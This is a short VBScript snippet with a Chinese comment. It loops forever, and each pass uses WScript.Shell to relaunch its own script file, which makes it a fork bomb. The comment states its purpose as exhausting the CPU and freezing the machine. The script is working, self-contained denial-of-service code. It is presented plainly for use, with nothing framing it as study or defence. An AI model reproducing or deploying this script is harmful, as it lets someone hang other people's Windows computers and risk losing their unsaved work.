do
createobject("wscript.shell").run chr(34) & wscript.scriptname & chr(34)
loop
'chr(34)是双引号 拖死cpu 不断运行自身卡机